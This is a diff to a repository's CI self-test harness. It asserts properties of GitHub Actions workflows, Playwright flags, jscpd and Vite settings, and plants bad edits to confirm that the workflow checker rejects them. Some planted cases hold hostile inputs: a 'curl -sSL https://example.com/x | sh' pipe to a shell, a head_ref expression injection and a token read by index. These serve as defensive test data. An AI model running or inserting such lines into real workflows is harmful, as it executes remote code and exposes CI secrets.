@@ -10098,11 +10098,40 @@ assert re.search(r"^        run: \$RUNNER_TEMP/zizmor/bin/zizmor --offline --no-
 night = jobs(strip((wf / "nightly.yml").read_text()))
 writer = [job for job, text in night.items() if re.search(r":\s*write\s*$", text, re.M)]
 assert writer == ["report"] and not re.search(r"actions/checkout@|scripts/|- \*", night["report"]), "the job that writes runs the repository's code"
+# The steps both workflows hold, each written once per file (an anchor stops at its file's end; .jscpd.json leaves the workflows
+# out for that): one definition each, the same text in both, so they cannot drift apart.
+def anchors(text):
+    found = re.findall(r"^      - &([\w-]+)\n((?:        .*\n)*)", text, re.M)
+    assert len(found) == len(dict(found)), f"an anchor defined twice: {sorted(n for n, _ in found if [m for m, _ in found].count(n) > 1)}"
+    return dict(found)
+ga, na = anchors((wf / "gate.yml").read_text()), anchors((wf / "nightly.yml").read_text())
+assert {"checkout", "go", "node", "pnpm", "chromium", "ergo", "gno-cache", "gno", "gitleaks"} <= set(ga) & set(na), f"the workflows no longer share their setup steps: {sorted(set(ga) & set(na))}"
+assert all(ga[k] == na[k] for k in set(ga) & set(na)), f"a step both workflows hold differs: {sorted(k for k in set(ga) & set(na) if ga[k] != na[k])}"
+JSCPD_IGNORE = ["docs/**", "gno/**", "pnpm-lock.yaml", "**/node_modules/**", "**/*.test.ts", "**/.git/**", "app/tests/chain/recorded/**",
+                "stryker.all.config.json", ".github/workflows/**"]
+assert json.loads((root / ".jscpd.json").read_text()).get("ignore") == JSCPD_IGNORE, "jscpd leaves out more than the workflows, or reads them"
+assert re.search(r"^        run: SKIP=missing_picture,tokens_pictures python3 -I scripts/probe\.py$", J["harness-selftest"], re.M), "the gate's probe.py skips more than the Mac's pictures"
+# Playwright on GitHub: no picture compared and nothing else turned off (no snapshot of any other kind in a spec), no test
+# left out but the flash's, whose phrase names one test in app/tests; a --grep picks only what it is known to.
+specs = {p: p.read_text() for p in (root / "app" / "tests").rglob("*.ts")}
+assert not [p for p, s in specs.items() if re.search(r"\bto(?:Match(?:Aria)?Snapshot)\(", s)], "a spec compares a snapshot --ignore-snapshots would pass"
+assert sum(s.count("a flash raised from a dialog shows above its scrim, at the top centre") for s in specs.values()) == 1, "the stories' left-out phrase names no test, or more than one"
+for name in names:
+    for line in re.findall(r"cli\.js test (.*)$", (wf / name).read_text(), re.M):
+        assert not re.search(r"--(?:pass-with-no-tests|last-failed|only-changed|max-failures)", line), f"{name}: a Playwright run that can pass on less: {line[:90]}"
+        assert re.findall(r"--grep-invert\s+('[^']*'|\S+)", line) in ([], ["'a flash raised from a dialog shows above its scrim, at the top centre$'"]), f"{name}: a journey or story left out beyond the flash's test: {line[:90]}"
+        picks = re.findall(r"--grep\s+('[^']*'|\S+)", line)
+        # The two picks it knows: flights' smoke (the journeys), the budgets' @gate tests (the build).
+        assert (not picks or line.endswith("flights.spec.ts --grep 'flies to the system aimed at|flies from the cosmos to a world'")
+                or line.endswith("app/tests/e2e/budgets.spec.ts app/tests/e2e/chunks.spec.ts --grep @gate")), f"{name}: a --grep that picks more than it knows: {line[:90]}"
+        assert "--update-snapshots" not in line or "--update-snapshots=none" in line, f"{name}: a run that writes pictures: {line[:90]}"
+vite = (root / "vitest.config.ts").read_text()
+assert 'const STORE = new URL("node_modules/.pnpm", import.meta.url);\n' in vite and re.findall(r"allow: \[(.*)\]", vite) == ['fileURLToPath(new URL(".", import.meta.url)), ...(existsSync(STORE) ? [realpathSync(STORE)] : [])'], "Vite may read more than the root and the borrowed store"
 rn = re.search(r"^    needs: \[(.*)\]$", night["report"], re.M)
 assert rn and sorted(rn.group(1).split(", ")) == sorted(set(night) - {"report"}) and conditions(night["report"]) == (["always()"], []), "a red job of the night reports nothing"
 assert 'gh issue list --repo "$REPO" --state open --app github-actions ' in night["report"], "the night's report may comment on another account's issue"
 for job, line in (("harness-nightly", "python3 -I scripts/harness_mutate.py"), ("harness-nightly", "sh scripts/test_hooks.sh"),
-                  ("harness-nightly", "python3 -I scripts/probe.py"), ("stryker", 'pnpm exec stryker run --concurrency "$(nproc)"'),
+                  ("harness-nightly", "SKIP=missing_picture,tokens_pictures python3 -I scripts/probe.py"), ("stryker", 'pnpm exec stryker run --concurrency "$(nproc)"'),
                   ("secrets-history", "sh scripts/scan_secrets.sh"), ("deploy-mutants", "sh deploy/test.sh --mutants")):
     assert re.search(r"^        run: " + re.escape(line) + "$", night[job], re.M), f"the night's {job} does not run {line} whole"
 merge = re.search(r'^\s*journeys="(app/[^"]*)"', (root / "scripts" / "check.sh").read_text(), re.M)
@@ -10133,6 +10162,7 @@ python3 -I - "$here/.." "$t/ci_static.py" "$t/ci_plant" <<'PY' || fail "a plante
 import pathlib, shutil, subprocess, sys
 root, checker, plant = pathlib.Path(sys.argv[1]), sys.argv[2], pathlib.Path(sys.argv[3])
 G, N, O, K = ".github/workflows/gate.yml", ".github/workflows/nightly.yml", ".github/CODEOWNERS", "scripts/ci_gate_ok.py"
+JS, V, B = ".jscpd.json", "vitest.config.ts", "app/tests/stories/behaviours.spec.ts"
 CASES = [
     (G, "        run: pnpm run format:check\n", '        run: echo " #"; curl -sSL https://example.com/x | sh\n', "a pipe to a shell behind a quoted #"),
     (G, "        run: pnpm run lint\n", "        run: |+\n          echo ${{ github.head_ref }}\n", "an expression in a |+ block"),
@@ -10154,6 +10184,19 @@ CASES = [
     (O, "/app/src/cspForms.ts @alexiscolin\n", "/app/src/cspForms.ts @alexiscolin\n* @someone\n", "a last line owning everything for another"),
     (G, "*) BASE=$(git merge-base origin/main HEAD) ;;", "*) BASE=$(git rev-parse HEAD) ;;", "a run by hand judged against itself"),
     (N, " --app github-actions", "", "the night comments on anyone's issue"),
+    (N, "--strip-components=1 package/pnpm", "--strip-components=1 package", "the night's pnpm step drifts from the gate's"),
+    (N, '        name: Ergo, the one the tests start (built from deploy/ergo/VERSION)\n', "        name: Ergo\n", "the night's Ergo step drifts from the gate's"),
+    (N, "      - *chromium\n      - name: harness_mutate.py", "      - &pnpm\n        name: x\n        run: echo\n      - *chromium\n      - name: harness_mutate.py", "an anchor defined twice"),
+    (JS, '".github/workflows/**"', '".github/workflows/**",\n    "scripts/**"', "jscpd widened to the scripts"),
+    (G, "SKIP=missing_picture,tokens_pictures python3", "SKIP=missing_picture,tokens_pictures,lint python3", "the gate's probe skips a guard"),
+    (N, "SKIP=missing_picture,tokens_pictures python3", "SKIP=missing_picture,tokens_pictures,lint python3", "the night's probe skips a guard"),
+    (G, "--grep-invert 'a flash raised from a dialog shows above its scrim, at the top centre$'", "--grep-invert 'a flash'", "the stories' exclusion widened"),
+    (G, "--ignore-snapshots --retries=1 --reporter=dot", "--ignore-snapshots --retries=1 --pass-with-no-tests --reporter=dot", "the journeys pass with no test"),
+    (G, "--reporter=dot app/tests/e2e/login.spec.ts", "--reporter=dot --grep chat app/tests/e2e/login.spec.ts", "the journeys picked by a --grep"),
+    (B, 'test("a flash raised from a dialog shows above its scrim, at the top centre"', 'test("the flash shows above its scrim"', "the left-out test renamed, the exclusion empty"),
+    (B, 'test("a flash raised from a dialog shows above its scrim, at the top centre"', 'test.describe("a flash raised from a dialog shows above its scrim, at the top centre", () => {});\ntest("a flash raised from a dialog shows above its scrim, at the top centre"', "the phrase on a second title"),
+    (B, "expect(await pill.screenshot()).toEqual(alone);", "await expect(page).toMatchAriaSnapshot(\"x\");", "a snapshot --ignore-snapshots would pass"),
+    (V, "[realpathSync(STORE)]", '[realpathSync(STORE), "/"]', "Vite allowed the whole disk"),
     (O, "/link-reader/package.json @alexiscolin\n", "", "a workspace package with no owner"),
     (G, 'pull_request) BASE=$(git merge-base "origin/$BASE_REF" HEAD) ;;', "pull_request) BASE=$(git rev-parse HEAD) ;;", "a base that is the change itself"),
     (G, "        run: python3 -I scripts/check_css.py\n", "        run: python3 -I scripts/check_css.py\n      - env:\n          T: ${{ github['token'] }}\n        run: echo\n", "the token by index"),
@@ -10166,17 +10209,31 @@ CASES = [
     (O, "/deploy/ @alexiscolin\n", "/deploy/ @someone\n", "the deploy owned by another"),
     (K, '    "zizmor": [],\n', "", "a job ci_gate_ok.py does not judge"),
 ]
-for n, (path, find, replace, why) in enumerate(CASES):
-    copy = plant / str(n)
-    for part in (".github", "package.json", "scripts/ci_gate_ok.py", "scripts/ci_changes.sh", "scripts/check.sh", ".githooks/records.sh", "link-reader/package.json"):
+def copy_of(name):
+    copy = plant / name
+    for part in (".github", "package.json", ".jscpd.json", "vitest.config.ts", "app/tests", "scripts/ci_gate_ok.py", "scripts/ci_changes.sh",
+                 "scripts/check.sh", ".githooks/records.sh", "link-reader/package.json"):
         (copy / part).parent.mkdir(parents=True, exist_ok=True)
         (shutil.copytree if (root / part).is_dir() else shutil.copy)(root / part, copy / part)
+    return copy
+# The control: an unplanted copy passes, or every plant below would fail for want of a file and prove nothing.
+r = subprocess.run([sys.executable, "-I", checker, str(copy_of("control"))], capture_output=True, text=True)
+assert r.returncode == 0, f"the workflows' checker fails an unplanted copy: {(r.stdout + r.stderr)[-400:]}"
+for n, (path, find, replace, why) in enumerate(CASES):
+    copy = copy_of(str(n))
     text = (copy / path).read_text()
     assert find in text, f"the planted case '{why}' no longer finds its text in {path}"
     (copy / path).write_text(text.replace(find, replace, 1))
     r = subprocess.run([sys.executable, "-I", checker, str(copy)], capture_output=True, text=True)
     assert r.returncode != 0, f"the workflows' checker passed {why}"
 PY
+# probe.py's SKIP, which the gate and the night use: an unknown name fails the run, a real one does not, and a skipped block
+# never runs (ONLY naming it then finds it not run). No block runs in these: ONLY names none of the first two.
+skipped() { (cd "$here/.." && ONLY="$1" SKIP="$2" python3 -I scripts/probe.py 2>&1); }
+skipped no_such_block ghost | grep -q "SKIP names no block: ghost" || fail "probe.py took a SKIP that names no block"
+skipped no_such_block lint | grep -q "SKIP names no block" && fail "probe.py refused a SKIP that names a real block"
+skipped no_such_block lint | grep -q "left out by SKIP: lint" || fail "probe.py did not say what SKIP left out"
+skipped prettier prettier | grep -q "ONLY names no block: prettier" || fail "probe.py ran a block SKIP names"
 # zizmor's own proof, as gate.yml runs it: with a zizmor that lets everything through, or refuses for another reason, it fails.
 python3 -I - "$here/../.github/workflows/gate.yml" "$t/zproof.sh" <<'PY' || fail "gate.yml's zizmor proof step is gone"
 import re, sys
